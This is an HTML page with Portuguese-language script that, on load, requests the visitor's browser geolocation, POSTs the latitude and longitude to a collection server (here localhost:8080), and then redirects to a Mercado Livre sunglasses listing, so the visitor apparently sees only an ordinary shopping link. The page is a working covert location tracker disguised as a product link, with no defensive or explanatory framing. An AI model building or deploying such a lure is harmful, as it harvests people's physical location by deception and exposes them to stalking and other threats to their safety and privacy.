<!DOCTYPE html>
<html>
<head>
    <title>Lupa</title>
</head>
<body>
    <script>

        const url = "https://www.mercadolivre.com.br/oculos-de-sol-juliet-lupa-do-vilo-mandrake-armaco-prata-cor-da-lente-varias-cores-desenho-lupa-de-vilo-armaco-pratalente-rosa/p/MLB29601503?item_id=MLB4788660232&from=gshop&matt_tool=43232742&matt_word=&matt_source=google&matt_campaign_id=14302214868&matt_ad_group_id=126141901865&matt_match_type=&matt_network=g&matt_device=c&matt_creative=542969653677&matt_keyword=&matt_ad_position=&matt_ad_type=pla&matt_merchant_id=735098639&matt_product_id=MLB29601503-product&matt_product_partition_id=1801429032863&matt_target_id=aud-1966873223882:pla-1801429032863&cq_src=google_ads&cq_cmp=14302214868&cq_net=g&cq_plt=gp&cq_med=pla&gad_source=1&gclid=Cj0KCQjwwae1BhC_ARIsAK4Jfrxjl4BctO2M4tZkvbuBnx_H1_GBGlHeP83Us_WCuqokbyPdPVBcqKoaAmweEALw_wcB";
        
    
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                console.log("Geolocalização não é suportada pelo seu navegador.");
            }
        }

        function showPosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            console.log("Latitude: " + latitude + " Longitude: " + longitude);

            sendLocationToServer(latitude, longitude)
   
            window.location.href = url;
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    console.log("Usuário negou a solicitação de Geolocalização.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    console.log("Informações de localização não estão disponíveis.");
                    break;
                case error.TIMEOUT:
                    console.log("A solicitação para obter a localização expirou.");
                    break;
                case error.UNKNOWN_ERROR:
                    console.log("Ocorreu um erro desconhecido.");
                    break;
            }

            window.location.href = url;
        }

        function sendLocationToServer(latitude, longitude) {
            fetch('http://localhost:8080/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    latitude: latitude,
                    longitude: longitude
                }),
            })
            .then(response => response.json())
            .then(data => console.log('Sucesso:', data))
            .catch((error) => console.error('Erro:', error));
        }

        window.onload = getLocation;
    </script>
</body>
</html>
